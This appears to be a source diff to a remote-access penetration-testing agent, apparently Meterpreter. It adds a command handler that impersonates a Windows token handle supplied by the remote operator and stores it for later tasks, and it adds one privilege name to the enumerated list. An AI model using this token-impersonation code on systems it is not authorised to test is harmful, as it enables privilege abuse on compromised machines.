@@ -8,6 +8,11 @@
 #include <ShlObj.h>
 typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
+// This may not be defined on some older systems in the header files, so lets define it here manually.
+#ifndef SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
+#define SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME TEXT("SeDelegateSessionUserImpersonatePrivilege")
+#endif
+
 /*!
  * @brief Add an environment variable / value pair to a response packet.
  * @param response The \c Response packet to add the values to.
@@ -271,6 +276,39 @@ DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 }
 
 /*
+ * @brief Updates an existing thread token.
+ * @param pRemote Pointer to the \c Remote instance.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_sys_config_update_token(Remote* pRemote, Packet* pPacket)
+{
+	Packet* pResponse = met_api->packet.create_response(pPacket);
+	DWORD dwResult = ERROR_SUCCESS;
+	HANDLE hToken = NULL;
+
+	// Get token handle from the client
+	hToken = (HANDLE)met_api->packet.get_tlv_value_qword(pPacket, TLV_TYPE_HANDLE);
+
+	// Impersonate token in the current thread
+	if (!ImpersonateLoggedOnUser(hToken))
+	{
+		dwResult = GetLastError();
+		dprintf("[UPDATE-TOKEN] Failed to impersonate token (%u)", dwResult);
+		met_api->packet.transmit_response(dwResult, pRemote, pResponse);
+		return dwResult;
+	}
+
+	// Store the token handle for future tasks
+	met_api->thread.update_token(pRemote, hToken);
+
+	// Empty response means success
+	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
+
+	return dwResult;
+}
+
+/*
  * sys_getprivs
  * ----------
  *
@@ -295,6 +333,7 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 		SE_CREATE_SYMBOLIC_LINK_NAME,
 		SE_CREATE_TOKEN_NAME,
 		SE_DEBUG_NAME,
+		SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME,
 		SE_ENABLE_DELEGATION_NAME,
 		SE_IMPERSONATE_NAME,
 		SE_INC_BASE_PRIORITY_NAME,
